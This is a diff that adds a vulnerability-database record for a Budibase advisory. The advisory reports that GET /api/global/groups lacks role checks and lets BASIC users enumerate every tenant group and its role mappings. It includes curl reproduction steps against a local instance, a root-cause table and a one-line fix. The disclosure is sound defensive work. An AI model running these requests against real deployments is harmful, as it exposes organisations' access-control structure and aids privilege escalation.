@@ -1,0 +1,131 @@
+[basic]
+description = '''
+## Summary
+
+The `GET /api/global/groups` endpoint on the worker service has no role-based authorization middleware. Any authenticated user (including BASIC role) can enumerate all user groups in the tenant, including their role mappings, user memberships, builder permissions, and the isDefault flag.
+
+## Steps to Reproduce
+
+### 1. Start Budibase
+
+```bash
+docker run -d --name budibase-poc -p 10000:80 \
+  -e MINIO_ACCESS_KEY=minio_access -e MINIO_SECRET_KEY=minio_secret \
+  -e INTERNAL_API_KEY=internal_api_key -e JWT_SECRET=jwt_secret_test \
+  -e API_ENCRYPTION_KEY=api_enc_key_test123456 \
+  -e BB_ADMIN_USER_EMAIL=admin@test.com \
+  -e BB_ADMIN_USER_PASSWORD=TestPassword123! \
+  budibase/budibase:latest
+
+until curl -sf http://localhost:10000/health; do sleep 5; done
+```
+
+### 2. Login as admin, create a user group, create a BASIC user
+
+```bash
+# Login as admin
+curl -s -c /tmp/bb_admin.txt -X POST http://localhost:10000/api/global/auth/default/login \
+  -H \"Content-Type: application/json\" \
+  -d '{\"username\":\"admin@test.com\",\"password\":\"TestPassword123!\"}'
+
+# Create a user group (requires license with user groups feature, or use Budibase Cloud)
+# On self-hosted without license, groups may not be available
+# If available:
+curl -s -b /tmp/bb_admin.txt -X POST http://localhost:10000/api/global/groups \
+  -H \"Content-Type: application/json\" \
+  -d '{\"name\":\"Secret Admin Group\",\"color\":\"#ff0000\",\"icon\":\"AdminPanelSettingsIcon\",\"roles\":{\"app_abc123\":\"ADMIN\"}}'
+
+# Create a BASIC user (no builder, no admin)
+curl -s -b /tmp/bb_admin.txt -X POST http://localhost:10000/api/global/users \
+  -H \"Content-Type: application/json\" \
+  -d '{\"email\":\"basic@test.com\",\"password\":\"BasicPass123!\",\"roles\":{},\"admin\":{\"global\":false},\"builder\":{\"global\":false}}'
+```
+
+### 3. Login as BASIC user and enumerate all groups (the vulnerability)
+
+```bash
+# Login as BASIC user
+curl -s -c /tmp/bb_basic.txt -X POST http://localhost:10000/api/global/auth/default/login \
+  -H \"Content-Type: application/json\" \
+  -d '{\"username\":\"basic@test.com\",\"password\":\"BasicPass123!\"}'
+
+# List ALL groups (should return 403, but returns 200 with full data)
+curl -s -b /tmp/bb_basic.txt http://localhost:10000/api/global/groups
+```
+
+**Expected:** 403 Forbidden (consistent with `GET /api/global/groups/:id` which requires `builderOrAdmin`)
+
+**Actual:** 200 OK with full group data including role mappings, member lists, and builder flags.
+
+### Standalone verification (code review)
+
+```bash
+# In the budibase source tree:
+grep -A2 'global/groups\"' packages/worker/src/api/routes/global/groups.ts
+```
+
+Output shows the list endpoint has NO auth middleware:
+```
+  .get(\"/api/global/groups\",            # <-- NO auth.builderOrAdmin
+    requireFeature(Feature.USER_GROUPS),
+    controller.fetch
+```
+
+Compare with the single-group endpoint directly below:
+```
+  .get(\"/api/global/groups/:groupId\",   # <-- HAS auth.builderOrAdmin
+    auth.builderOrAdmin,
+    requireFeature(Feature.USER_GROUPS),
+    controller.getById
+```
+
+## Root Cause
+
+File: `packages/worker/src/api/routes/global/groups.ts`, lines 40-44
+
+The list endpoint is the ONLY group endpoint without RBAC:
+
+| Endpoint | Auth Middleware |
+|----------|---------------|
+| `POST /api/global/groups` | `auth.adminOnly` |
+| `DELETE /api/global/groups/:id/:rev` | `auth.adminOnly` |
+| `GET /api/global/groups/:id` | `auth.builderOrAdmin` |
+| `GET /api/global/groups/:id/users` | `auth.builderOrAdmin` |
+| **`GET /api/global/groups`** | **NONE** |
+
+## Impact
+
+A BASIC-role user can enumerate: all group names/colors/icons, which apps each group accesses and at what role level, user membership lists (user IDs), builder permission flags, and the isDefault flag. This exposes organizational access control structure and aids reconnaissance for privilege escalation.
+
+## Suggested Fix
+
+```diff
+  router.get(\"/api/global/groups\",
++   auth.builderOrAdmin,
+    requireFeature(Feature.USER_GROUPS),
+    controller.fetch
+  )
+```
+'''
+published = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+score = 5
+severity = "MEDIUM"
+sources = ["ghsa"]
+title = "Budibase: Missing RBAC on GET /api/global/groups allows BASIC users to enumerate all tenant groups and role mappings"
+updated = ""
+
+[exploit]
+exp_urls = []
+poc_urls = []
+
+[id]
+aliases = ["GHSA-4qcj-m5wp-jmf4"]
+ave_id = "AVE-2026-1006"
+
+[meta]
+collected_at = "2026-08-05T18:58:52.616477401+00:00"
+status = "completed"
+
+[references]
+urls = []
